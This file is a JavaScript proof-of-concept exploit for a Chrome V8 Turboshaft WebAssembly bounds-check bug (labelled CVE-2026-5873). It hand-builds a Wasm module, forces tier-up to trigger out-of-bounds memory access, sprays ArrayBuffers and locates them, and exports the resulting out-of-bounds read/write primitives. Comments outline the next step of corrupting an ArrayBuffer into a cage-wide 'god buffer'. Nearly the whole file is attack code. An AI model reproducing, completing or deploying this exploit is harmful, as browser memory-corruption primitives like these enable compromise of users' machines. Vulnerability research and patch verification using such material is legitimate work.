// CVE-2026-5873: Turboshaft WebAssembly OOB Read/Write
// Target: Chrome 146.0.7680.165 (V8 14.6.202.26)
// Fixed in: Chrome 147.0.7727.55
//
// Root cause: Bounds-check elimination in Turboshaft Wasm compiler.
// i32.convert_i64 truncates to 32 bits; after tier-up from Liftoff,
// Turboshaft incorrectly eliminates the bounds check on the truncated index.
//
// Based on: Hacktron AI blog analysis (April 2026)

"use strict";

// --- WASM Module with OOB Bug ---
// The trigger: a function that takes i64, truncates to i32, shifts, and uses as memory index
// Under Liftoff: bounds check on full 64-bit → safe
// Under Turboshaft: bounds check eliminated after i32.convert_i64 → OOB

function buildOOBModule() {
    // WAT equivalent:
    // (module
    //   (memory (export "mem") 1)  ;; 1 page = 64KB
    //   (func $read (export "read") (param i64) (result i32)
    //     local.get 0
    //     i32.wrap_i64          ;; truncates to lower 32 bits
    //     i32.const 2
    //     i32.shl               ;; index * 4 (byte offset)
    //     i32.load align=4 offset=0
    //   )
    //   (func $write (export "write") (param i64) (param i32)
    //     local.get 0
    //     i32.wrap_i64
    //     i32.const 2
    //     i32.shl
    //     local.get 1
    //     i32.store align=4 offset=0
    //   )
    //   (func $warmup (export "warmup") (param i32)
    //     ;; Loop to trigger tier-up
    //     (local $i i32)
    //     (local.set $i (i32.const 0))
    //     (block $break
    //       (loop $loop
    //         (br_if $break (i32.ge_u (local.get $i) (local.get 0)))
    //         ;; Access within bounds to train Turboshaft
    //         (drop (i32.load (i32.and (local.get $i) (i32.const 0x3fff))))
    //         (local.set $i (i32.add (local.get $i) (i32.const 1)))
    //         (br $loop)
    //       )
    //     )
    //   )
    // )

    const wasmBytes = new Uint8Array([
        0x00, 0x61, 0x73, 0x6d, // magic
        0x01, 0x00, 0x00, 0x00, // version

        // Type section (3 function types)
        0x01, 0x11, 0x03,
        0x60, 0x01, 0x7e, 0x01, 0x7f,             // type 0: (i64) -> (i32)
        0x60, 0x02, 0x7e, 0x7f, 0x00,             // type 1: (i64, i32) -> ()
        0x60, 0x01, 0x7f, 0x00,                   // type 2: (i32) -> ()

        // Function section
        0x03, 0x04, 0x03, 0x00, 0x01, 0x02,       // 3 functions: types 0, 1, 2

        // Memory section (1 page = 64KB)
        0x05, 0x03, 0x01, 0x00, 0x01,

        // Export section
        0x07, 0x1d, 0x04,
        0x03, 0x6d, 0x65, 0x6d,  0x02, 0x00,              // "mem" = memory 0
        0x04, 0x72, 0x65, 0x61, 0x64,  0x00, 0x00,         // "read" = func 0
        0x05, 0x77, 0x72, 0x69, 0x74, 0x65,  0x00, 0x01,   // "write" = func 1
        0x06, 0x77, 0x61, 0x72, 0x6d, 0x75, 0x70,  0x00, 0x02, // "warmup" = func 2

        // Code section
        0x0a, 0x3a, 0x03,

        // func $read: (i64) -> (i32)
        0x0a, 0x00,            // body size, 0 locals
        0x20, 0x00,            // local.get 0
        0xa7,                  // i32.wrap_i64
        0x41, 0x02,            // i32.const 2
        0x74,                  // i32.shl
        0x28, 0x02, 0x00,     // i32.load align=4 offset=0
        0x0b,                  // end

        // func $write: (i64, i32) -> ()
        0x0c, 0x00,
        0x20, 0x00,            // local.get 0
        0xa7,                  // i32.wrap_i64
        0x41, 0x02,            // i32.const 2
        0x74,                  // i32.shl
        0x20, 0x01,            // local.get 1
        0x36, 0x02, 0x00,     // i32.store align=4 offset=0
        0x0b,                  // end

        // func $warmup: (i32) -> ()
        0x1f, 0x01, 0x01, 0x7f, // body size, 1 local (i32)
        0x41, 0x00,            // i32.const 0
        0x21, 0x01,            // local.set $i
        0x02, 0x40,            // block $break
          0x03, 0x40,          // loop $loop
            0x20, 0x01,        // local.get $i
            0x20, 0x00,        // local.get 0
            0x4d,              // i32.ge_u
            0x0d, 0x01,        // br_if $break
            0x20, 0x01,        // local.get $i
            0x41, 0xff, 0x7f,  // i32.const 0x3fff
            0x71,              // i32.and
            0x28, 0x02, 0x00,  // i32.load align=4 offset=0
            0x1a,              // drop
            0x20, 0x01,        // local.get $i
            0x41, 0x01,        // i32.const 1
            0x6a,              // i32.add
            0x21, 0x01,        // local.set $i
            0x0c, 0x00,        // br $loop
          0x0b,                // end loop
        0x0b,                  // end block
        0x0b,                  // end func
    ]);

    return new WebAssembly.Module(wasmBytes);
}

// --- OOB Trigger: Tier-up + Bounds Check Elimination ---

async function triggerOOB() {
    const mod = buildOOBModule();
    const inst = new WebAssembly.Instance(mod);
    const { read, write, warmup, mem } = inst.exports;

    // Fill memory with marker pattern
    const view = new Uint32Array(mem.buffer);
    for (let i = 0; i < view.length; i++) {
        view[i] = 0xDEAD0000 | (i & 0xFFFF);
    }

    // Warmup to trigger Turboshaft tier-up
    let bugActive = false;
    for (let batch = 0; batch < 50 && !bugActive; batch++) {
        // Heavy warmup loop
        warmup(2000000);

        // Train read/write paths with in-bounds accesses
        for (let i = 0; i < 1000000; i++) {
            read(BigInt(i & 0x3fff));
        }
        for (let i = 0; i < 1000000; i++) {
            write(BigInt(i & 0x3fff), (i & 0xff) | 0);
        }

        // Yield to allow Turboshaft compilation
        await new Promise(r => setTimeout(r, 500));

        // Check if bug is active: try reading beyond 64KB boundary
        // If Turboshaft eliminated the bounds check, this reads OOB
        const oobVal = read(0x100000000n + 0x4000n); // upper 32 bits set, lower = valid
        if (oobVal !== view[0x4000]) {
            bugActive = true;
            _log("[OOB] Bug active! Turboshaft eliminated bounds check");
            _log("[OOB] OOB read returned: 0x" + (oobVal >>> 0).toString(16));
        }
    }

    if (!bugActive) {
        _log("[OOB] ERROR: Failed to trigger tier-up after 50 batches");
        return null;
    }

    return { read, write, mem };
}

// --- Phase: Spray ArrayBuffers and Discover Cage Layout ---

function sprayArrayBuffers(count, size) {
    const buffers = [];
    for (let i = 0; i < count; i++) {
        const ab = new ArrayBuffer(size);
        const view = new Uint32Array(ab);
        // Write unique marker at start
        view[0] = 0xCAFE0000 | i;
        view[1] = 0xBEEF0000 | i;
        buffers.push(ab);
    }
    return buffers;
}

async function buildCageRW() {
    _log("[OOB] Spraying 64 ArrayBuffers (64KB each)...");
    const buffers = sprayArrayBuffers(64, 65536);

    _log("[OOB] Triggering Turboshaft OOB bug...");
    const oob = await triggerOOB();
    if (!oob) return null;

    const { read, write } = oob;

    // Scan OOB region for ArrayBuffer backing store markers
    _log("[OOB] Scanning for ArrayBuffer backing stores...");
    let targetOffset = -1;

    for (let off = 0x4000; off < 0x100000; off += 0x1000) {
        const val = read(BigInt(off));
        if ((val & 0xFFFF0000) === 0xCAFE0000) {
            const idx = val & 0xFFFF;
            const check = read(BigInt(off + 1));
            if (check === (0xBEEF0000 | idx)) {
                _log("[OOB] Found ArrayBuffer #" + idx + " at OOB offset 0x" + off.toString(16));
                targetOffset = off;
                break;
            }
        }
    }

    if (targetOffset === -1) {
        _log("[OOB] ERROR: Could not find ArrayBuffer backing store in OOB range");
        return null;
    }

    // Corrupt target ArrayBuffer to create "god buffer" covering entire cage
    _log("[OOB] Corrupting ArrayBuffer → god buffer...");
    // The JSArrayBuffer object in V8 has:
    //   +0x14: byte_length (uint32)
    //   +0x18: byte_length high (uint32)
    //   +0x24: backing_store low (cage offset)
    //   +0x28: backing_store high

    // We need to find the JSArrayBuffer OBJECT (not backing store) and corrupt it
    // This requires scanning the heap for the object header
    // For now, return the OOB primitives

    return {
        oobRead: (off) => read(BigInt(off)),
        oobWrite: (off, val) => write(BigInt(off), val),
        buffers: buffers
    };
}

function _log(msg) {
    if (typeof console !== 'undefined') console.log(msg);
}

// Export
if (typeof module !== 'undefined') {
    module.exports = { buildCageRW, triggerOOB };
}
